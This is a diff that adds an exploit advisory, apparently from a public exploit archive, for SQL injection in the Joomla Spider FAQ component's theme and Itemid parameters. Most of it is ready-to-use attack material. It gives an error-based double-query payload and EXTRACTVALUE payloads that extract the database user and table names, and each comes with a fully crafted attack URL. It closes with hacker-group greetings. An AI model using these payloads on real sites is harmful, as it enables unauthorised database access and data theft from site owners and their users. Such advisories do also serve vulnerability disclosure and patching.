@@ -1,0 +1,71 @@
+##################################################################################################
+#Exploit Title : Joomla Spider FAQ component SQL Injection vulnerability
+#Author        : Manish Kishan Tanwar AKA error1046
+#Vendor Link   : http://demo.web-dorado.com/spider-faq.html
+#Date          : 21/03/2015
+#Discovered at : IndiShell Lab
+#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Incredible,Kishan Singh and ritu rathi
+#Discovered At : Indishell Lab
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+
+
+joomla component Spider FAQ is not filtering data in theme and Itemid parameters
+and hence affected from SQL injection vulnerability 
+
+///////////////////////////////
+// Vulnerability Description:
+///////////////////////////////
+vulnerability is due to theme and Itemid parameter 
+
+////////////////
+///  POC   ////
+///////////////
+
+POC image=http://oi57.tinypic.com/2rh1zk7.jpg
+
+SQL Injection in theme parameter
+=================================
+
+Use error based double query injection with theme parameter
+Like error based double query injection for exploiting username --->
+and(select 1 FROM(select count(*),concat((select (select concat(user(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- - 
+
+Injected Link--->
+http://website.com/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0&faq_cats=,2,3,&standcatids=&theme=4 and(select 1 FROM(select count(*),concat((select (select concat(user(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- - &searchform=1&expand=0&Itemid=109
+
+
+SQL Injection in Itemid parameter
+=================================
+
+Itemid Parameter is exploitable using xpath injection 
+
+User extraction payload
+------------------------
+' AND EXTRACTVALUE(6678,CONCAT(0x7e,(SELECT user() LIMIT 0,1),0x7e))-- -
+
+crafted URL--->
+http://localhostm/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0&faq_cats=,2,3,&standcatids=&theme=4&searchform=1&expand=0&Itemid=109' AND EXTRACTVALUE(6678,CONCAT(0x7e,(SELECT user() LIMIT 0,1),0x7e))-- -
+
+Table extraction
+-----------------
+' and extractvalue(6678,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e))-- -
+
+Crafted URL---->
+http://localhost/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0&faq_cats=,2,3,&standcatids=&theme=4&searchform=1&expand=0&Itemid=109' and extractvalue(6678,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e))-- -
+
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba, 
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
+#############################################################################################
+                             --==[[Love to]]==--
+# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty and Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
